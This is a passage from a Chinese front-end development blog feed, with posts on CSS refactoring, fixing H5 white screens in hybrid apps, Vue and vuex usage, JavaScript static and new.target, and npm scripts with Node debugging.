class="comment"> * ---------------------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">/* 组件样式：消息框 */</span></span><br><span class="line"> <span class="comment">/* 组件样式：按钮 */</span></span><br><span class="line"> <span class="comment">/* 组件样式：轮播框 */</span></span><br><span class="line"> <span class="comment">/* 组件样式：下拉框 */</span></span><br><span class="line"> <span class="comment">/* 组件样式：模态框 */</span></span><br><span class="line"> <span class="comment">/* 等等 */</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 结构化样式</span></span><br><span class="line"><span class="comment"> * ---------------------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">/* 结构化样式：结算区域的布局 */</span><span class="number">1</span></span><br><span class="line"> <span class="comment">/* 结构化样式：侧边栏的布局 */</span></span><br><span class="line"> <span class="comment">/* 结构化样式：主区域的布局 */</span></span><br><span class="line"> <span class="comment">/* 结构化样式：个人设置区域的布局 */</span></span><br><span class="line"> <span class="comment">/* 等等 */</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 功能样式</span></span><br><span class="line"><span class="comment"> * ---------------------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h4 id="6-2-3-多个-CSS-文件"><a href="#6-2-3-多个-CSS-文件" class="headerlink" title="6.2.3 多个 CSS 文件"></a>6.2.3 多个 CSS 文件</h4><p>随着项目成长，只用一个 CSS 文件，代码维护难度可能逐渐增大，当大到难以维护时，显然需要将其拆分为多个文件。</p>
<p>你的项目结构看起来像下面这样：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">|-css/</span><br><span class="line">| |-normalizing-styles</span><br><span class="line">| | |- normalize.css</span><br><span class="line">| |</span><br><span class="line">| |-base-styles</span><br><span class="line">| | |- forms.css</span><br><span class="line">| | |- headings.css</span><br><span class="line">| | |- images.css</span><br><span class="line">| | |- lists.css</span><br><span class="line">| | |- tables.css</span><br><span class="line">| | |- etc.</span><br><span class="line">| |</span><br><span class="line">| |-component-styles</span><br><span class="line">| | |- alerts.css</span><br><span class="line">| | |- buttons.css</span><br><span class="line">| | |- carousel.css</span><br><span class="line">| | |- dropdowns.css</span><br><span class="line">| | |- modals.css</span><br><span class="line">| | |- etc.</span><br><span class="line">| |</span><br><span class="line">| |- structural-styles</span><br><span class="line">| | |- layout-checkout.css</span><br><span class="line">| | |- layout-sidebar.css</span><br><span class="line">| | |- layout-primary.css</span><br><span class="line">| | |- layout-settings.css</span><br><span class="line">| | |- etc.</span><br><span class="line">| |</span><br><span class="line">| |- utility-styles</span><br><span class="line">| | |- utility.css</span><br><span class="line">| |</span><br><span class="line">| |- browser-specific-styles</span><br><span class="line">| | |-ie8.css</span><br></pre></td></tr></table></figure>

<h3 id="6-3-重构前审查-CSS"><a href="#6-3-重构前审查-CSS" class="headerlink" title="6.3 重构前审查 CSS"></a>6.3 重构前审查 CSS</h3><p>可以从以下角度审查：</p>
<ul>
<li>所用到的属性列表</li>
<li>使用某一特定属性的声明块列表</li>
<li>使用的颜色数量</li>
<li>使用的最高和最低特指度</li>
<li>拥有最高和最低特指度的选择器</li>
<li>选择器的长度</li>
</ul>
<h3 id="6-4-重构策略"><a href="#6-4-重构策略" class="headerlink" title="6.4 重构策略"></a>6.4 重构策略</h3><p>条件允许的话，应该只对你能够维护的小块代码进行重构，并做到经常评审和发布。如果一次重构和发布大量代码，引入错误的风险更大，因为改动的内容更多。</p>
<ol>
<li>保持规则集结构的一致性</li>
<li>删除僵尸代码</li>
<li>分离 CSS 和 JavaScript</li>
<li>分离基础样式</li>
<li>删除冗余的 ID</li>
<li>将 ID 转化为类</li>
<li>区分功能性样式</li>
<li>定义可复用组件样式</li>
<li>删除行内 CSS 和过于模块化的类</li>
<li>隔离面向定义浏览器的 CSS 样式</li>
</ol>
<h3 id="6-5-评估重构是否成功"><a href="#6-5-评估重构是否成功" class="headerlink" title="6.5 评估重构是否成功"></a>6.5 评估重构是否成功</h3><ul>
<li>你的网站崩溃了吗</li>
<li>UI bug 数</li>
<li>减少开发和测试时间</li>
</ul>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://www.ituring.com.cn/book/1943">CSS 重构：样式性能调优</a></p>
<p>[2] <a href="https://github.com/jameskrauser/cssrefectoring-example">cssrefectoring-example</a></p>
<p>[3] <a href="http://necolas.github.io/normalize.css/">normalize.css</a></p>
<p>[4] <a href="https://www.w3.org/TR/CSS21/propidx.html">CSS 属性继承的完整列表</a></p>
<p>[5] <a href="https://html.spec.whatwg.org/multipage/dom.html">HTML 元素的完整列表</a></p>
<p>[6] <a href="https://netmarketshare.com/">浏览器市场份额分析(2020.10 已停止数据更新)</a></p>
<p>[7] <a href="https://tongji.baidu.com/research/site">百度统计-流量研究院</a></p>
<p>[8] <a href="https://marketingplatform.google.com/about/analytics/">谷歌分析平台</a></p>
<p>[9] <a href="https://github.com/google/styleguide">谷歌编码规范</a></p>
<p>[10] <a href="https://developer.wordpress.org/coding-standards/wordpress-coding-standards/">WordPress 编码规范</a></p>
<p>[11] <a href="https://engineering.18f.gov/frontend/#css">18F 前端指南</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>阅读</tag>
        <tag>重构</tag>
      </tags>
  </entry>
  <entry>
    <title>混合App中H5白屏修复及样式兼容</title>
    <url>/2022/02/22/20220222-%E6%B7%B7%E5%90%88App%E4%B8%ADH5%E7%99%BD%E5%B1%8F%E4%BF%AE%E5%A4%8D%E5%8F%8A%E6%A0%B7%E5%BC%8F%E5%85%BC%E5%AE%B9/</url>
    <content><![CDATA[<h2 id="白屏修复"><a href="#白屏修复" class="headerlink" title="白屏修复"></a>白屏修复</h2><p>混合 App 中 H5 首次加载出现白屏有以下可能：</p>
<ul>
<li>代码编译过长加载的渲染阻塞(白屏时间过长，结果会正常渲染)</li>
<li>代码编译错误引起渲染失败(一直白屏)</li>
</ul>
<p>代码编译过长加载的渲染阻塞，可以通过优化代码解决。代码编译错误引起渲染失败，就得修复代码的 BUG 了。</p>
<h3 id="是什么原因引起的编译错误"><a href="#是什么原因引起的编译错误" class="headerlink" title="是什么原因引起的编译错误"></a>是什么原因引起的编译错误</h3><p>通过产品反馈的结果来看，少部分用户手机进入混合 App 中 H5 首页时，出现白屏，而多数用户没有这种情况。初步确认是手机系统上的 webview 版本低导致代码不兼容，所以编译错误，渲染失败，就一直卡在白屏了。</p>
<p>为了进一步验证是 webview 版本过低引起的 BUG，我借用了 2 个 Android 测试机(android 4.4.4，android 12)，并借助<code>chrome://inspect/#devices</code> 调试混合 App 中 H5，发现在 android 4.4.4 版本测试机上，代码报错，出现白屏，而 android 12 版本测试机正常，因此得以验证：混合 App 中 H5 的代码没有兼容到低版本的 webview 。</p>
<h3 id="开始修复"><a href="#开始修复" class="headerlink" title="开始修复"></a>开始修复</h3><p>查看该 H5 代码，很多都是 ES6 ，需要转译成 ES5，才兼容低版本的 webview。可以通过 Babel 转译，打包项目的时候转译成 ES5。Babel 配置，详见 <a href="https://www.babeljs.cn/docs/">https://www.babeljs.cn/docs/</a></p>
<h2 id="样式兼容"><a href="#样式兼容" class="headerlink" title="样式兼容"></a>样式兼容</h2><p>低版本的 webview 需要兼容 CSS3。怎么兼容呢，CSS3 的样式属性需要加前缀 -webkit-(安卓，IOS 用的 webview 的内核是这个, 其他前缀不用考虑)。项目那么多 CSS3 样式，难道要手动都加上吗，其实可以走配置的。PostCSS 是一个允许使用插件转换样式的插件，用法详见 <a href="https://github.com/postcss/postcss/blob/main/docs/README-cn.md">https://github.com/postcss/postcss/blob/main/docs/README-cn.md</a></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://www.cnblogs.com/JQstronger/p/WebView.html">基于 H5 的混合开发介绍（一）WebView</a></p>
<p>[2] <a href="https://segmentfault.com/a/1190000021633356">你需要的 App 内 h5 的调试方法</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>H5</tag>
        <tag>混合APP</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue开发应用中遇到的问题与总结</title>
    <url>/2022/03/02/20220302-Vue%E5%BC%80%E5%8F%91%E5%BA%94%E7%94%A8%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E4%B8%8E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="1-data-与-computed-区别"><a href="#1-data-与-computed-区别" class="headerlink" title="1 data 与 computed 区别"></a>1 data 与 computed 区别</h2><p>data，<a href="https://cn.vuejs.org/v2/api/#data">详见</a></p>
<p>computed，<a href="https://cn.vuejs.org/v2/api/#computed">详见</a></p>
<h3 id="data-中不能使用-computed-中的数据-computed-中可以使用-data-数据"><a href="#data-中不能使用-computed-中的数据-computed-中可以使用-data-数据" class="headerlink" title="data 中不能使用 computed 中的数据, computed 中可以使用 data 数据"></a>data 中不能使用 computed 中的数据, computed 中可以使用 data 数据</h3><p>归根结底就是一个 Vue 实例在渲染的时候数据解析的顺序问题。官方 v2.6.14 版本源码，<a href="https://vscode.dev/github/vuejs/vue/blob/v2.6.14/src/core/index.js">详见</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// props -&gt; methods -&gt; data -&gt; computed -&gt; watch</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">initState</span>(<span class="params">vm: Component</span>) &#123;</span><br><span class="line">  vm.<span class="property">_watchers</span> = []</span><br><span class="line">  <span class="keyword">const</span> opts = vm.<span class="property">$options</span></span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">props</span>) <span class="title function_">initProps</span>(vm, opts.<span class="property">props</span>)</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">methods</span>) <span class="title function_">initMethods</span>(vm, opts.<span class="property">methods</span>)</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">data</span>) &#123;</span><br><span class="line">    <span class="title function_">initData</span>(vm)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">observe</span>((vm.<span class="property">_data</span> = &#123;&#125;), <span class="literal">true</span> <span class="comment">/* asRootData */</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">computed</span>) <span class="title function_">initComputed</span>(vm, opts.<span class="property">computed</span>)</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">watch</span> &amp;&amp; opts.<span class="property">watch</span> !== nativeWatch) &#123;</span><br><span class="line">    <span class="title function_">initWatch</span>(vm, opts.<span class="property">watch</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>! 注意</p>
<p>以上代码的执行顺序，并非是 Vue 风格指南中<a href="https://cn.vuejs.org/v2/style-guide/#%E7%BB%84%E4%BB%B6-%E5%AE%9E%E4%BE%8B%E7%9A%84%E9%80%89%E9%A1%B9%E7%9A%84%E9%A1%BA%E5%BA%8F%E6%8E%A8%E8%8D%90">组件&#x2F;实例的选项的顺序</a></p>
</blockquote>
<h2 id="2-vuex-中-mapState-辅助函数"><a href="#2-vuex-中-mapState-辅助函数" class="headerlink" title="2 vuex 中 mapState 辅助函数"></a>2 vuex 中 mapState 辅助函数</h2><p><a href="https://v3.vuex.vuejs.org/zh/guide/state.html#mapstate-%E8%BE%85%E5%8A%A9%E5%87%BD%E6%95%B0">用法详见</a></p>
<p><code>mapState</code> 函数返回的是一个对象，结合 ES6 的扩展运算符，就能自动实现 computed 中的多个计算属性加入，减少手动一个个的去写。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">  localComputed () &#123; <span class="comment">/* ... */</span> &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用对象展开运算符将此对象混入到外部对象中</span></span><br><span class="line">  ...<span class="title function_">mapState</span>(&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用对象展开运算符将此对象<code>混入到外部对象</code>中，这句话就很关键。</p>
<p>另外，mapGetters，mapActions，mapMutations 与 mapState 的用法有着异曲同工之妙。</p>
<h2 id="3-vuex中Modules命名空间理解"><a href="#3-vuex中Modules命名空间理解" class="headerlink" title="3 vuex中Modules命名空间理解"></a>3 vuex中Modules命名空间理解</h2><p>默认情况下，模块内部的 action、mutation 和 getter 是注册在<strong>全局命名空间</strong>的——这样使得多个模块能够对同一 mutation 或 action 作出响应。<a href="https://v3.vuex.vuejs.org/zh/guide/modules.html#%E6%A8%A1%E5%9D%97%E7%9A%84%E5%B1%80%E9%83%A8%E7%8A%B6%E6%80%81">用法详见</a></p>
<blockquote>
<p>! 注意</p>
<p>在没有 namespaced: true 指明的模块中，除了 action、mutation 和 getter，其它都是<strong>局部的</strong>，state 是局部的。</p>
<p>对于模块内部的 action，局部状态通过 <code>context.state</code> 暴露出来，根节点状态则为 <code>context.rootState</code>，这也是为什么 action 的参数不用store实例本身，而是 context 上下文。</p>
</blockquote>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://www.cnblogs.com/boji/p/15929728.html">Vue data 与 computed 的区别</a></p>
<p>[2] <a href="https://www.cnblogs.com/tugenhua0707/p/9794423.html">理解 Vuex 的辅助函数 mapState, mapActions, mapMutations 用法</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>static与new.target关键字</title>
    <url>/2021/07/16/20220303-static%E4%B8%8Enew.target%E5%85%B3%E9%94%AE%E5%AD%97/</url>
    <content><![CDATA[<h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><p>static 在类中定义静态方法。</p>
<h3 id="什么时候能用"><a href="#什么时候能用" class="headerlink" title="什么时候能用"></a>什么时候能用</h3><p>看方法里，有没用到this，没用到就可以考虑用静态方法。静态方法通常用于创建实用程序函数，例如，创建或克隆对象。</p>
<h3 id="什么时候不能用"><a href="#什么时候不能用" class="headerlink" title="什么时候不能用"></a>什么时候不能用</h3><p>不能在类的实例上调用。</p>
<h3 id="怎么调用"><a href="#怎么调用" class="headerlink" title="怎么调用"></a>怎么调用</h3><p>以下几种情况都可调用：</p>
<ol>
<li><p>静态方法调用直接在类上进行。</p>
</li>
<li><p>静态方法调用同一个类中的其他静态方法，可使用 <code>this</code> 关键字</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StaticMethodCall</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">staticMethod</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Static method has been called&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">anotherStaticMethod</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">staticMethod</span>() + <span class="string">&#x27; from another static method&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">StaticMethodCall</span>.<span class="title function_">staticMethod</span>();</span><br><span class="line"><span class="comment">// &#x27;Static method has been called&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">StaticMethodCall</span>.<span class="title function_">anotherStaticMethod</span>();</span><br><span class="line"><span class="comment">// &#x27;Static method has been called from another static method&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>非静态方法中，不能直接使用 <code>this</code> 关键字来访问静态方法。而是要用类名来调用：<code>CLASSNAME.STATIC_METHOD_NAME()</code> ，或者用构造函数的属性来调用该方法： <code>this.constructor.STATIC_METHOD_NAME()</code>.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StaticMethodCall</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">StaticMethodCall</span>.<span class="title function_">staticMethod</span>());</span><br><span class="line">    <span class="comment">// &#x27;static method has been called.&#x27;</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">constructor</span>.<span class="title function_">staticMethod</span>());</span><br><span class="line">    <span class="comment">// &#x27;static method has been called.&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">staticMethod</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;static method has been called.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="new-target"><a href="#new-target" class="headerlink" title="new.target"></a>new.target</h2><p>**<code>new.target</code>**属性允许检测函数或构造方法是否是通过<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/new">new</a>运算符被调用的。在普通函数（没有被 new 的函数）调用中，<code>new.target</code> 的值是<code>undefined</code></p>
<p>注意，在类的构造方法中，<code>new.target</code>指向直接被<code>new</code>执行的构造函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span>.<span class="property">target</span>.<span class="property">name</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_ inherited__">A</span> &#123; </span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123; </span><br><span class="line">    <span class="variable language_">super</span>(); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title function_">A</span>(); <span class="comment">// logs &quot;A&quot;</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title function_">B</span>(); <span class="comment">// logs &quot;B&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123; </span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123; </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span>.<span class="property">target</span>); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span> <span class="keyword">extends</span> <span class="title class_ inherited__">C</span> &#123; </span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123; </span><br><span class="line">    <span class="variable language_">super</span>(); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> <span class="title function_">C</span>(); <span class="comment">// logs class C&#123;constructor()&#123;console.log(new.target);&#125;&#125;</span></span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title function_">D</span>(); <span class="comment">// logs class D extends C&#123;constructor()&#123;super();&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes/static">mdn web docs - static</a></p>
<p>[2] <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/new.target">mdn web docs - new.target</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>从npm script到node调试</title>
    <url>/2022/03/04/20220304-%E4%BB%8Enpm-script%E5%88%B0node%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<h2 id="npm-script"><a href="#npm-script" class="headerlink" title="npm script"></a>npm script</h2><h3 id="初体验"><a href="#初体验" class="headerlink" title="初体验"></a>初体验</h3><p>package.json</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;serve&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node build.js&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>命令行下使用<code>npm run</code>命令，就可以执行这段脚本。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ npm run serve</span><br><span class="line"><span class="comment"># 等同于</span></span><br><span class="line">$ node build.js</span><br></pre></td></tr></table></figure>

<h3 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h3><p><code>package.json</code> 文件里面，使用 <code>script</code> 字段定义脚本命令。它有以下优点：</p>
<ul>
<li>项目的相关脚本，可以集中在一个地方。</li>
<li>不同项目的脚本命令，只要功能相同，就可以有同样的对外接口。用户不需要知道怎么测试你的项目，只要运行<code>npm run test</code>即可。</li>
<li>可以利用 npm 提供的很多辅助功能。</li>
</ul>
<p>查看当前项目的所有 npm 脚本命令，可以使用不带任何参数的<code>npm run</code>命令。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ npm run</span><br></pre></td></tr></table></figure>

<p><a href="https://docs.npmjs.com/cli/v8/using-npm/scripts">官方用法详见</a></p>
<p>官方：脚本从包文件夹的根目录运行，无论<code>npm</code>调用时当前工作目录是什么。如果您希望您的脚本根据您所在的子目录使用不同的行为，您可以使用<code>INIT_CWD</code>环境变量，它包含您<strong>运行时</strong>所在的完整路径<code>npm run</code></p>
<p>解读：INIT_CWD 好比变量 NODE_ENV，获取它的值局限于运行时所在的完整路径的文件，不能在该运行时的脚本引入的模块中使用，要想在模块当中直接使用，我们还需要一些配置</p>
<ul>
<li>webpack4 之前可以使用<strong>DefinePlugin</strong>插件配置</li>
<li>webpack4 版本之后可以通过 mode 选项实现</li>
</ul>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>每当执行<code>npm run</code>，就会自动新建一个 Shell，在这个 Shell 里面执行指定的脚本命令。因此，只要是 Shell（一般是 Bash）可以运行的命令，就可以写在 npm 脚本里面。<a href="https://www.npmjs.cn/cli/run-script/">官方用法详见</a></p>
<p>除了 Shell 预先存在的<code>PATH</code>，<code>npm run</code>添加 <code>node_modules/.bin</code>到<code>PATH</code>提供的脚本中。本地安装的依赖项提供的任何二进制文件都可以在没有<code>node_modules/.bin</code> 前缀的情况下使用。例如，如果你的包中有一个<code>devDependency</code>on <code>tap</code>，你应该写：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tap test/\*.js&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>而不用写成下面这样。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node_modules/.bin/tap test/\*.js&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="npm-脚本执行顺序"><a href="#npm-脚本执行顺序" class="headerlink" title="npm 脚本执行顺序"></a>npm 脚本执行顺序</h4><p>如果 npm 脚本里面需要执行多个任务，那么需要明确它们的执行顺序。</p>
<ul>
<li><p>并行执行，可以使用<code>&amp;</code>符号。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ npm run script1.js &amp; npm run script2.js</span><br></pre></td></tr></table></figure>

<p>而的 package.json 中的 script 写法。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;script1.js &amp; script2.js&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>继发执行（即只有前一个任务成功，才执行下一个任务），可以使用<code>&amp;&amp;</code>符号。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;script1.js &amp;&amp; script2.js&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="npm-脚本传入参数"><a href="#npm-脚本传入参数" class="headerlink" title="npm 脚本传入参数"></a>npm 脚本传入参数</h4><p>要使用<code>--</code>标明</p>
<h2 id="node-调试"><a href="#node-调试" class="headerlink" title="node 调试"></a>node 调试</h2><p>Node.js 包含了一个命令行的调试实用工具。 Node.js 调试器客户端不是功能齐全的调试器，但可以进行简单的步进和检查。要使用它，则使用 <code>inspect</code> 参数启动 Node.js，后跟要调试的脚本的路径。</p>
<h3 id="node-vscode-调试"><a href="#node-vscode-调试" class="headerlink" title="node + vscode 调试"></a>node + vscode 调试</h3><p>标记 debugger 位置，然后借助 vscode 的调试工具即可实现。<a href="https://code.visualstudio.com/docs/editor/debugging">官方用法详见</a></p>
<h3 id="node-chrome-x2F-x2F-inspect-调试"><a href="#node-chrome-x2F-x2F-inspect-调试" class="headerlink" title="node + chrome:&#x2F;&#x2F;inspect 调试"></a>node + chrome:&#x2F;&#x2F;inspect 调试</h3><p>V8 检查器集成允许将 Chrome 开发者工具绑定到 Node.js 实例以进行调试和分析。</p>
<p>V8 检查器可以通过在启动 Node.js 应用程序时传入 <code>--inspect</code> 标志来启用。 也可以使用该标志提供自定义的端口，例如 <code>--inspect=9222</code> 将接受端口 9222 上的开发者工具连接。</p>
<p>要中断应用程序代码的第一行，则传入 <code>--inspect-brk</code> 标志而不是 <code>--inspect</code>。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ node --inspect-brk index.js</span><br><span class="line">Debugger listening on ws://127.0.0.1:9229/dc9010dd-f8b8-4ac5-a510-c1a114ec7d29</span><br><span class="line">For <span class="built_in">help</span>, see: https://nodejs.org/en/docs/inspector</span><br></pre></td></tr></table></figure>

<h3 id="从-npm-script-到-node-调试"><a href="#从-npm-script-到-node-调试" class="headerlink" title="从 npm script 到 node 调试"></a>从 npm script 到 node 调试</h3><p>在实际开发调试过程中，我们有这样一个需求，nodejs 环境下使用 package.json 脚本设置项目环境变量，这时我们会使用 process.env.NODE_ENV （<a href="https://www.jianshu.com/p/83e8909fc1cd">NODE_ENV</a> 是变量名）进行获取当前的环境变量进行区分不同的运行环境。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NODE_ENV=development webpack-dev-server --inline --progress  --config build/webpack.dev.conf.js --host 0.0.0.0&quot;</span></span><br><span class="line">    ...</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>编辑完脚本以后当使用脚本的时候发现没有生效，这是因为 windows 不支持直接设置 <code>NODE_ENV=development</code>的方式。</p>
<blockquote>
<p>tips</p>
<p>当您使用这样 package.json 中的 scripts 来设置环境变量时，大多数 Windows 命令提示符都会阻塞 <code>NODE_ENV=development</code>。（例外是<a href="https://msdn.microsoft.com/en-us/commandline/wsl/about">Bash on Windows</a>，它使用本机 Bash。）同样，windows 和 POSIX 命令使用环境变量的方式也有所不同。在 POSIX 中，您使用：<code>$ENV_VAR</code> ，在 Windows 上，您使用<code>%ENV_VAR%</code>。</p>
</blockquote>
<p><code>NODE_ENV=development</code>在 windows 环境下会报错，需要改为<code>set NODE_ENV=development</code>，而 Mac 环境的方式是 <code>export NODE_ENV=development</code> 。为了解决这个差异，可以使用<code>cross-env</code>跨平台的设置和使用环境变量。</p>
<p><code>cross-env</code>使您可以拥有一个命令，而无需担心为平台正确设置或使用环境变量。就像在 POSIX 系统上运行时一样设置它，并且<code>cross-env</code>会正确设置它。<a href="https://github.com/kentcdodds/cross-env#usage">官方用法详见</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ npm add -D cross-env</span><br></pre></td></tr></table></figure>

<p>对应的 package.json script 配置如下：</p>
